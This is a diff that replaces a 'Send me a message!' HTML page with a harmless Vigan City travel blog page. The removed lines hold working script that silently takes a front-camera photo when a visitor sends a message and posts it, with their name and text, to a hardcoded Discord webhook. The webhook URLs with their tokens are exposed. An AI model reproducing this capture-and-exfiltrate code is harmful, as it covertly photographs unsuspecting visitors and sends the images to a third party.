@@ -1,385 +1,176 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Send me a message!</title>
+    <title>Vigan City Blog</title>
     <style>
-        /* Apply a background gradient animation */
         body {
-            background: linear-gradient(90deg, #ff9a8b, #ff6a88, #ff6a88, #ff9a8b);
-            background-size: 400% 100%;
-            animation: backgroundAnimation 10s infinite;
+            font-family: Arial, sans-serif;
+            background-color: #36393f; /* Discord UI background color */
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
         }
-
-        @keyframes backgroundAnimation {
-            0% {
-                background-position: 200% 0;
-            }
-            100% {
-                background-position: -200% 0;
-            }
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            padding: 20px;
         }
-
-        /* Style the message and buttons */
-        h1 {
-            font-size: 28px;
-            text-align: center;
+        .header {
+            background-color: #333; /* Slightly darker header color */
             color: #fff;
-            margin-top: 50px;
-            animation: fadeInUp 1s;
-        }
-
-        .button-container {
+            padding: 20px;
             text-align: center;
-            margin-top: 20px;
         }
-
-        button {
-            display: inline-block;
+        .header-logo {
+            max-width: 150px;
+            margin: 0 auto;
+            display: block;
+        }
+        .logo-bar {
+            display: flex;
+            overflow: hidden;
+        }
+        .logo-bar img {
             margin: 0 10px;
-            padding: 10px 20px;
-            background-color: #3498db;
-            color: #fff;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s, transform 0.2s;
+            animation: moveLogos 10s linear infinite;
         }
-
-        button:hover {
-            background-color: #2980b9;
-            transform: scale(1.05);
+        .blog-embed {
+            background-color: #2f3136; /* Darker background for blog content */
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
-
-        /* Animation for fadeInUp */
-        @keyframes fadeInUp {
-            0% {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Style for displaying the image */
-        #image-container {
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        #captured-image {
-            max-width: 100%;
-            height: auto;
-        }
-
-        /* Loading screen styles */
-        #loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            display: none; /* Initially hidden */
-        }
-
-        #loading-text {
+        .blog-title {
             font-size: 24px;
+            font-weight: bold;
+            color: #ffffff;
+        }
+        .blog-text {
+            font-size: 16px;
+            line-height: 1.6;
+            color: #cccccc; /* Lighter text color */
+        }
+        .footer {
+            background-color: #333;
             color: #fff;
-        }
-
-        /* Message input styles */
-        #message-input {
+            padding: 20px;
             text-align: center;
-            margin-top: 20px;
-            animation: slideIn 1s; /* Add animation */
-            display: flex;
-            flex-direction: column;
-            align-items: center; /* Align content to the middle */
         }
-
-        @keyframes slideIn {
-            0% {
-                opacity: 0;
-                transform: translateY(-50px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        .comment-section {
+            background-color: #2f3136; /* Darker background for comment section */
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
-
-        #name-input {
-            width: 80%;
+        .comment-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffffff;
+        }
+        .comment-form {
+            margin-top: 10px;
+        }
+        .comment-input {
+            width: 100%;
             padding: 10px;
-            font-size: 16px;
-            border: 1px solid #ccc;
-            margin-top: 10px; /* Add margin for spacing */
+            margin-bottom: 10px;
+            background-color: #40444b; /* Discord input background color */
+            border: none;
+            color: #ffffff;
+            border-radius: 5px;
         }
-
-        #message-textarea {
-            width: 80%;
+        .comment-input::placeholder {
+            color: #72767d; /* Discord input placeholder text color */
+        }
+        .comment-textarea {
+            width: 100%;
+            height: 100px;
             padding: 10px;
-            font-size: 16px;
-            border: 1px solid #ccc;
+            margin-bottom: 10px;
+            background-color: #40444b; /* Discord input background color */
+            border: none;
+            color: #ffffff;
+            border-radius: 5px;
         }
-
-        #send-message-button {
-            background-color: #3498db;
+        .comment-textarea::placeholder {
+            color: #72767d; /* Discord input placeholder text color */
+        }
+        .comment-submit {
+            background-color: #7289DA; /* Discord UI accent color */
             color: #fff;
             border: none;
             padding: 10px 20px;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s, transform 0.2s;
-            margin-top: 10px; /* Add margin for spacing */
         }
-
-        #send-message-button:hover {
-            background-color: #2980b9;
-            transform: scale(1.05);
-        }
-
-        /* Confirmation message styles */
-        #confirmation-message {
-            font-size: 18px;
-            color: #fff;
-            text-align: center;
-            display: none; /* Initially hidden */
-            margin-top: 20px;
+        @keyframes moveLogos {
+            0% {
+                transform: translateX(-100%);
+            }
+            100% {
+                transform: translateX(100%);
+            }
         }
     </style>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const buttonContainer = document.createElement('div');
-            buttonContainer.className = 'button-container';
-
-            const loadingScreen = document.createElement('div');
-            loadingScreen.id = 'loading-screen';
-
-            const loadingText = document.createElement('div');
-            loadingText.id = 'loading-text';
-            loadingText.textContent = 'Loading...';
-
-            document.body.appendChild(buttonContainer);
-
-            // Function to create the message input elements
-            function createMessageInput() {
-                const sendButton = document.createElement('button');
-                sendButton.textContent = 'Send a message for Squidygamingg!';
-                sendButton.id = 'sendButton';
-                buttonContainer.appendChild(sendButton);
-
-                sendButton.addEventListener('click', () => {
-                    // Prompt the user for the message
-                    const messageText = prompt('Enter your message for Squidygamingg:');
-                    if (messageText !== null && messageText !== '') {
-                        // Hide the send button
-                        sendButton.style.display = 'none';
-
-                        // Create message input elements
-                        const messageInput = document.createElement('div');
-                        messageInput.id = 'message-input';
-
-                        const nameInput = document.createElement('input');
-                        nameInput.type = 'text';
-                        nameInput.id = 'name-input';
-                        nameInput.placeholder = 'Name';
-                        nameInput.required = true; // Make Name field required
-
-                        const messageTextarea = document.createElement('textarea');
-                        messageTextarea.id = 'message-textarea';
-                        messageTextarea.value = messageText; // Set the message from the prompt
-                        messageTextarea.placeholder = 'Enter your message...';
-                        messageTextarea.required = true; // Make Message field required
-
-                        const sendMessageButton = document.createElement('button');
-                        sendMessageButton.textContent = 'Send Message';
-                        sendMessageButton.id = 'send-message-button';
-
-                        messageInput.appendChild(nameInput); // Add the name input
-                        messageInput.appendChild(messageTextarea);
-                        messageInput.appendChild(sendMessageButton);
-
-                        document.body.appendChild(messageInput);
-
-                        sendMessageButton.addEventListener('click', async () => {
-                            const nameText = nameInput.value;
-                            const messageText = messageTextarea.value;
-
-                            if (nameText && messageText) {
-                                // Display the loading screen
-                                loadingScreen.style.display = 'flex';
-
-                                // Capture front camera image
-                                const imageBlob = await captureFrontCameraImage();
-
-                                // Send a message with the captured image, name, and text
-                                sendMessageWithImageAndText(imageBlob, nameText, messageText);
-
-                                // Hide the message input
-                                messageInput.style.display = 'none';
-
-                                // Show the confirmation message
-                                const confirmationMessage = document.getElementById('confirmation-message');
-                                confirmationMessage.textContent = 'Thank you for your message! Wait for the owner to include your text in the Comments (response)';
-                                confirmationMessage.style.display = 'block';
-
-                                // Hide the loading screen
-                                loadingScreen.style.display = 'none';
-                            }
-                        });
-                    }
-                });
-            }
-
-            // Function to capture front camera image
-            async function captureFrontCameraImage() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.createElement('video');
-                    document.body.appendChild(video);
-                    video.srcObject = stream;
-                    await video.play();
-
-                    // Capture a frame from the video stream as an image
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Convert the captured frame to a data URL (base64)
-                    const imageBlob = canvas.toDataURL('image/jpeg');
-
-                    // Stop the camera stream and remove the video element
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
-
-                    return imageBlob;
-                } catch (error) {
-                    console.error('Error capturing image:', error);
-                    return null;
-                }
-            }
-
-            // Function to send a message with an image, name, and text using a Discord webhook
-            function sendMessageWithImageAndText(imageBlob, nameText, messageText) {
-                // Replace 'YOUR_WEBHOOK_URL_HERE' with your actual Discord webhook URL
-                const webhookURL = 'https://discordapp.com/api/webhooks/1156295739438276608/_9y-AowFIIMfpYlSB_h2Ya7nvo1ehBeuUvpn4y-GqOA7WEzIksm0Np-Yee47OdO2_Bdl';
-
-                const formData = new FormData();
-                formData.append('file', dataURItoBlob(imageBlob), 'image.jpg');
-                formData.append('content', `**Name:** ${nameText}\n**Message:** ${messageText}`); // Format as Discord Markdown
-
-                fetch(webhookURL, {
-                    method: 'POST',
-                    body: formData,
-                })
-                .then(response => {
-                    console.log('Image and text sent to Discord webhook.');
-                })
-                .catch(error => {
-                    console.error('Error sending image and text to Discord webhook:', error);
-                });
-            }
-
-            // Helper function to convert data URI to Blob
-            function dataURItoBlob(dataURI) {
-                const byteString = atob(dataURI.split(',')[1]);
-                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-                const ab = new ArrayBuffer(byteString.length);
-                const ia = new Uint8Array(ab);
-                for (let i = 0; i < byteString.length; i++) {
-                    ia[i] = byteString.charCodeAt(i);
-                }
-                return new Blob([ab], { type: mimeString });
-            }
-
-            // Create the message input when the page loads
-            createMessageInput();
-
-            // Function to send scheduled messages
-            function sendScheduledMessages() {
-    const now = new Date();
-    
-    // Convert the current time to GMT+8
-    const gmt8Hour = now.getUTCHours() + 8; // Add 8 hours to UTC time
-    const minute = now.getUTCMinutes();
-    
-    const webhookURL = 'https://discordapp.com/api/webhooks/1157302481123037255/puzWXAVDnDSeX3UJxeFHZWDKGriu1b4Gn19fI0xhrL2DnQ29GBj_bfPXIelnXHIh55m1';
-    const headers = {
-        'Content-Type': 'application/json',
-    };
-    
-    if (gmt8Hour === 23 && minute === 59) {
-        // Send "INITIATING RESTART IN 1 MINUTE"
-        const message = {
-            content: 'INITIATING RESTART IN 1 MINUTE',
-        };
-        
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: headers,
-            body: JSON.stringify(message),
-        })
-        .then(response => {
-            console.log('Scheduled message sent: INITIATING RESTART IN 1 MINUTE');
-        })
-        .catch(error => {
-            console.error('Error sending scheduled message:', error);
-        });
-    } else if (gmt8Hour === 0 && minute === 1) {
-        // Send "TEST IN PROGRESS"
-        const message = {
-            content: 'TEST IN PROGRESS',
-        };
-        
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: headers,
-            body: JSON.stringify(message),
-        })
-        .then(response => {
-            console.log('Scheduled message sent: TEST IN PROGRESS');
-        })
-        .catch(error => {
-            console.error('Error sending scheduled message:', error);
-        });
-    } else if (gmt8Hour === 0 && minute === 2) {
-        // Send "TEST COMPLETE"
-        const message = {
-            content: 'TEST COMPLETE',
-        };
-        
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: headers,
-            body: JSON.stringify(message),
-        })
-        .then(response => {
-            console.log('Scheduled message sent: TEST COMPLETE');
-        })
-        .catch(error => {
-            console.error('Error sending scheduled message:', error);
-        });
-    }
-}
-
-// Check and send scheduled messages every minute
-setInterval(sendScheduledMessages, 60000);
-        });
-    </script>
 </head>
 <body>
-    <h1>Send me a message!</h1>
-    <!-- Add a div to display the confirmation message -->
-    <div id="confirmation-message"></div>
+    <div class="header">
+        <div class="logo-bar">
+            <img src="https://tr.rbxcdn.com/63e72fad226fc48f4ce7789fe3adc7a8/150/150/Image/Png" alt="Logo 1">
+            <img src="https://tr.rbxcdn.com/f07de714ae44b2e287d9cfd392a6ade0/150/150/Image/Png" alt="Logo 2">
+            <img class="header-logo" src="https://tr.rbxcdn.com/ea7e6398061ea3431949c6843a9db7e2/150/150/Image/Png" alt="Company Logo">
+            <img src="https://tr.rbxcdn.com/f35e5f1dd7a819d596959763c1878cc4/150/150/Image/Png" alt="Logo 3">
+            <img src="https://tr.rbxcdn.com/812d29cb26d16624320a3d4a2bf19d58/150/150/Image/Png" alt="Logo 4">
+            <img src="https://tr.rbxcdn.com/8d786e48ce39ec26f2ad4bdb70c6a25c/150/150/Image/Png" alt="Logo 5">
+            <img src="https://tr.rbxcdn.com/d813abf2d970751561732e2f241c8723/150/150/Image/Png" alt="Logo 6">
+            <img src="https://tr.rbxcdn.com/9a036b550e852f02df8c8c1e0ea4bb47/150/150/Image/Png" alt="Logo 7">
+            <img src="https://tr.rbxcdn.com/cf018df430d08afa94449221651cbb55/150/150/Image/Png" alt="Logo 8">
+            <img src="https://tr.rbxcdn.com/c6d02019065a55548954ec1c0760c86f/150/150/Image/Png" alt="Logo 9">
+            <img src="https://tr.rbxcdn.com/95a1df08c878197dcdae495907b2caaf/150/150/Image/Png" alt="Logo 10">
+            <img src="https://tr.rbxcdn.com/d3227a69bbff11496d3c87168b94bfbe/150/150/Image/Png" alt="Logo 11">
+            <img src="https://tr.rbxcdn.com/bfec638aba3c3c90fa585fe75317cfb1/150/150/Image/Png" alt="Logo 12">
+            <img src="https://tr.rbxcdn.com/8c066b3d1c713ca2d76f4acaa322bded/150/150/Image/Png" alt="Logo 13">
+        </div>
+    </div>
+    <div class="container">
+        <div class="blog-embed">
+            <div class="blog-title">Vigan City: Where History Comes to Life</div>
+            <div class="blog-text">
+                Picture this: stepping into a time machine that whisks you away to a bygone era, where the past unfolds before your eyes. No need for a DeLorean to experience this magic – just plan a visit to Vigan City, a true Philippine treasure steeped in history and culture. Nestled in the northern reaches of the country, Vigan City is akin to a living museum, seamlessly weaving history into the fabric of the present. From its cobblestone streets to the meticulously preserved Spanish colonial houses, Vigan offers an enchanting experience for travelers both local and foreign.
+            </div>
+        </div>
+        <div class="blog-embed">
+            <div class="blog-title">A Journey Through Time in Vigan City</div>
+            <div class="blog-text">
+                As you wander the cobbled streets of Calle Crisologo, it's as though you've been transported to a different century. The rhythmic clip-clop of horse-drawn carriages reverberates through the air, while the tantalizing aroma of freshly baked empanadas beckons you closer. The sight of centuries-old architecture lining the streets conjures images of the Spanish colonial era. In this city, transitions between eras are as effortless as exploring its many museums and historical sites, where you can delve deep into Vigan's captivating history, marked by numerous phases, including Spanish colonization and the trying times of Japanese occupation during World War II.
+            </div>
+        </div>
+        <div class="blog-embed">
+            <div class="blog-title">Culinary Delights of Vigan City</div>
+            <div class="blog-text">
+                Vigan City isn't merely a haven for history buffs; it's a culinary paradise for food enthusiasts as well. The transition from exploring historical sites to embarking on culinary adventures is seamless in this city. Immerse yourself in the flavors of local cuisine, relishing the renowned Vigan longganisa and the crispy delight of bagnet. These mouthwatering delicacies connect the past to the present, bridging generations of culinary expertise. Dining in centuries-old ancestral houses further extends the continuum between history and the contemporary. In this city, every transition offers a unique experience, a connection between time periods, and an opportunity to discover the heart of Filipino culture.
+            </div>
+        </div>
+        <div class="blog-embed">
+            <div class="blog-title">Experience Vigan's Timeless Warmth</div>
+            <div class="blog-text">
+                While Vigan City maintains its historic charm, it's a vibrant community that welcomes both local and foreign travelers with open arms. Festivals such as the Viva Vigan Festival of Arts and Culture seamlessly bridge transitions in the city's history through dance, music, and art. Here, the warmth and hospitality of the locals transcend time, making Vigan an alluring destination for anyone seeking a harmonious blend of history, culture, and the present. Come and experience the graceful transitions of time in this extraordinary city. Create unforgettable memories in a place where the past meets the present, and where history is celebrated and cherished. Vigan City awaits, and it's a journey you won't want to miss.
+            </div>
+        </div>
+        <div class="comment-section">
+            <div class="comment-title">Leave a Comment</div>
+            <form class="comment-form">
+                <input class="comment-input" type="text" placeholder="Name">
+                <input class="comment-input" type="email" placeholder="Email">
+                <textarea class="comment-textarea" placeholder="Your Comment"></textarea>
+                <button class="comment-submit" type="submit">Submit Comment</button>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        &copy; 2023 Vigan City Blog
+    </div>
 </body>
 </html>
